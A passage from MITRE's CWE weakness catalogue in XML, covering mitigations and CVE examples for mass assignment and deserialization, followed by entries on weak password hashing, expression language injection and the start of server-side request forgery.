            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>For any externally-influenced input, check the input against an allowlist of internal object attributes or fields that are allowed to be modified.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Strategy>Refactoring</Strategy>
               <Description>Refactor the code so that object attributes or fields do not need to be dynamically identified, and only expose getter/setter functionality for the intended attributes.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2012-2054</Reference>
               <Description>Mass assignment allows modification of arbitrary attributes using modified URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-2055</Reference>
               <Description>Source version control product allows modification of trusted key using mass assignment.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2055</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7310</Reference>
               <Description>Attackers can bypass payment step in e-commerce product.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7310</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-1465</Reference>
               <Description>Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-1465</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3527</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system might allow code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0911</Reference>
               <Description>Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0911</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-4962</Reference>
               <Description>Content management system written in PHP allows code execution through page comments.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-4962</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4137</Reference>
               <Description>Use of PHP unserialize function on cookie value allows remote code execution or upload of arbitrary files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4137</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5741</Reference>
               <Description>Content management system written in Python interprets untrusted data as pickles, allowing code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5741</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-2520</Reference>
               <Description>Python script allows local users to execute code via pickled data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-2520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2875</Reference>
               <Description>Python script allows remote attackers to execute arbitrary code using pickled objects.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2875</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2013-0277</Reference>
               <Description>Ruby on Rails allows deserialization of untrusted YAML to execute arbitrary code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2013-0277</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2011-2894</Reference>
               <Description>Spring framework allows deserialization of objects from untrusted sources to execute arbitrary code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2011-2894</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-1833</Reference>
               <Description>Grails allows binding of arbitrary parameters to modify arbitrary object properties.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-1833</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-3258</Reference>
               <Description>Incorrect deserialization in web browser allows escaping the sandbox.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-3258</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1013</Reference>
               <Description>Media library allows deserialization of objects by untrusted Java applets, leading to arbitrary code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1013</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-885"/>
            <Reference External_Reference_ID="REF-886"/>
            <Reference External_Reference_ID="REF-887"/>
            <Reference External_Reference_ID="REF-888"/>
            <Reference External_Reference_ID="REF-889"/>
            <Reference External_Reference_ID="REF-890"/>
            <Reference External_Reference_ID="REF-891"/>
            <Reference External_Reference_ID="REF-892"/>
            <Reference External_Reference_ID="REF-893"/>
            <Reference External_Reference_ID="REF-894"/>
            <Reference External_Reference_ID="REF-464"/>
            <Reference External_Reference_ID="REF-466"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-01-26</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Observed_Examples</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
               <Contribution_Name>Dan Amodio, Dave Wichers</Contribution_Name>
               <Contribution_Organization>Aspect Security</Contribution_Organization>
               <Contribution_Date>2013-01-26</Contribution_Date>
               <Contribution_Comment>Suggested adding mass assignment, provided references, and clarified relationship with AutoBinding.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="916" Name="Use of Password Hash With Insufficient Computational Effort" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.</Description>
         <Extended_Description>
            <xhtml:p>Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.</xhtml:p>
            <xhtml:p>Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.</xhtml:p>
            <xhtml:p>There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>The amount of CPU time required to compute the hash ("stretching")</xhtml:li>
                  <xhtml:li>The amount of memory required to compute the hash ("memory-hard" operations)</xhtml:li>
                  <xhtml:li>Including a random value, along with the password, as input to the hash computation ("salting")</xhtml:li>
                  <xhtml:li>Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs ("one-way" hashing)</xhtml:li>
                  <xhtml:li>Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs ("collision resistance")</xhtml:li>
               </xhtml:ul>
            <xhtml:p>Note that the security requirements for the product may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.</xhtml:p>
                  <xhtml:p>Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.</xhtml:p>
                  <xhtml:p>Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-1526</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1526</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-1058</Reference>
               <Description>Router does not use a salt with a hash, making it easier to crack passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-1058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4905</Reference>
               <Description>Blogging software uses a hard-coded salt when calculating a password hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4905</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1657</Reference>
               <Description>Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1657</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0967</Reference>
               <Description>Server uses a constant salt when encrypting passwords, simplifying brute force attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="55"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-291"/>
            <Reference External_Reference_ID="REF-292"/>
            <Reference External_Reference_ID="REF-293" Section="5.2 PBKDF2"/>
            <Reference External_Reference_ID="REF-294"/>
            <Reference External_Reference_ID="REF-295"/>
            <Reference External_Reference_ID="REF-296"/>
            <Reference External_Reference_ID="REF-297"/>
            <Reference External_Reference_ID="REF-298"/>
            <Reference External_Reference_ID="REF-636"/>
            <Reference External_Reference_ID="REF-631"/>
            <Reference External_Reference_ID="REF-632"/>
            <Reference External_Reference_ID="REF-908"/>
            <Reference External_Reference_ID="REF-909"/>
            <Reference External_Reference_ID="REF-633"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-01-28</Submission_Date>
               <Submission_Comment>Created with input from members of the secure password hashing community.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="917" Name="Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.</Description>
	 <Extended_Description>Frameworks such as Java Server Page (JSP) allow a developer to insert executable expressions within otherwise-static content. When the developer is not aware of the executable nature of these expressions and/or does not disable them, then if an attacker can inject expressions, this could lead to code execution or other unexpected behaviors.</Extended_Description>
         <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="PeerOf" CWE_ID="1336" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>EL Injection</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid adding user-controlled data into an expression interpreter when possible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>If user-controlled data must be added to an expression interpreter, one or more of the following should be performed:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Validate that the user input will not evaluate as an expression</xhtml:li>
                        <xhtml:li>Encode the user input in a way that ensures it is not evaluated as an expression</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Operation</Phase>
               <Description>The framework or tooling might allow the developer to disable or deactivate the processing of EL expressions, such as setting the isELIgnored attribute for a JSP page to "true".</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
			  <Observed_Example>
			    <Reference>CVE-2021-44228</Reference>
			    <Description>Product does not neutralize ${xyz} style expressions, allowing remote code execution. (log4shell vulnerability in log4j)</Description>
			    <Link>https://www.cve.org/CVERecord?id=CVE-2021-44228</Link>
			  </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-911"/>
            <Reference External_Reference_ID="REF-912"/>
            <Reference External_Reference_ID="REF-1279"/>
            <Reference External_Reference_ID="REF-1280"/>
         </References>
         <Notes>
            <Note Type="Maintenance">The interrelationships and differences between CWE-917 and CWE-1336 need to be further clarified.</Note>
            <Note Type="Relationship">In certain versions of Spring 3.0.5 and earlier, there was a vulnerability (CVE-2011-2730) in which Expression Language tags would be evaluated twice, which effectively exposed any application to EL injection. However, even for later versions, this weakness is still possible depending on configuration.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-02-15</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
               <Contribution_Name>Dan Amodio, Dave Wichers</Contribution_Name>
               <Contribution_Organization>Aspect Security</Contribution_Organization>
               <Contribution_Date>2013-02-15</Contribution_Date>
               <Contribution_Comment>Suggested adding this weakness and provided references.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="918" Name="Server-Side Request Forgery (SSRF)" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.</Description>
         <Extended_Description>By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="441" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSPA</Term>
               <Description>Cross Site Port Attack</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-26855</Reference>
               <Description>Server Side Request Forgery (SSRF) in mail server, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-26855</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21973</Reference>
               <Description>Server Side Request Forgery in cloud platform, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21973</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2016-4029</Reference>
	      <Description>Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2016-4029</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1484</Reference>
               <Description>Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1484</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2061</Reference>
               <Description>CGI script accepts and retrieves incoming URLs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1637</Reference>
               <Description>Web-based mail program allows internal network scanning using a modified POP3 port number.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1637</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0037</Reference>
